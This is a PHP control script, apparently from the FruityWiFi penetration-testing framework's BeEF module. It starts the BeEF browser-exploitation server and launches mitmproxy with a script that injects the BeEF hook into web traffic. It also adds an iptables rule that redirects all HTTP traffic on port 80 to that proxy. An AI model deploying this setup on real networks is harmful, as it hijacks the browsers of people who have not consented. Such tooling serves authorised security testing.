<? 
/*
	Copyright (C) 2013-2016 xtr4nge [_AT_] gmail.com

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/ 
?>
<?php
include "../login_check.php";
include "../../../config/config.php";
include "../_info_.php";
include "../../../functions.php";

// Checking POST & GET variables...
if ($regex == 1) {
    regex_standard($_GET["service"], "../msg.php", $regex_extra);
    regex_standard($_GET["file"], "../msg.php", $regex_extra);
    regex_standard($_GET["action"], "../msg.php", $regex_extra);
    regex_standard($_GET["install"], "../msg.php", $regex_extra);
}

$service = $_GET['service'];
$action = $_GET['action'];
$page = $_GET['page'];
$install = $_GET['install'];

$port = 9990;

if($service != "") {
    if ($action == "start") {
        // COPY LOG
		$exec = "$bin_cp $mod_logs $mod_logs_history/".gmdate("Ymd-H-i-s").".log";
		exec_fruitywifi($exec);
		
		if ($mod_beef_kali == "1") {
			$exec = "/etc/init.d/beef-xss restart";
			exec_fruitywifi($exec);
		} else {
			$exec = "/usr/bin/ruby -C beef-master/ beef > /tmp/beef.log &";
			$exec = "./beef";
			exec_fruitywifi($exec);
			//exec_fruitywifi_env($exec);
			//exec($exec);
		}
		
		if ($mod_beef_auto == "1") {
			$exec = "$bin_mitmproxy -q --port $port -T --host -s 'inject_beef.py $io_in_ip' >> $mod_logs &";
			exec_fruitywifi($exec);
			
			$exec = "$bin_iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port $port";
			exec_fruitywifi($exec);
		}
		
    } else if($action == "stop") {
		
		$exec = "$bin_iptables -t nat -D PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port $port";
		exec_fruitywifi($exec);
	
		$exec = "ps aux|grep -E 'mitmdump.+inject_beef' | grep -v grep | awk '{print $2}'";
		exec($exec,$output);
		
		$exec = "kill " . $output[0];
		exec_fruitywifi($exec);
		
		unset($output);
		
		if ($mod_beef_kali == "1") {
			$exec = "/etc/init.d/beef-xss stop";
			exec_fruitywifi($exec);
		}
		
		$exec = "ps aux|grep -iEe 'ruby.+beef' | grep -v grep | awk '{print $2}'";
		exec($exec,$output);
		
		$exec = "kill " . $output[0];
		exec_fruitywifi($exec);
    }
}


if ($install == "install_$mod_name") {

    $exec = "chmod 755 install.sh";
    exec_fruitywifi($exec);

    $exec = "$bin_sudo ./install.sh > $log_path/install.txt &";
    exec_fruitywifi($exec);
    
    header('Location: ../../install.php?module='.$mod_name);
    exit;
}

if ($page == "status") {
    header('Location: ../../../action.php');
} else {
    header('Location: ../../action.php?page='.$mod_name);
}
//header('Location: ../../action.php?page=sslstrip');

?>
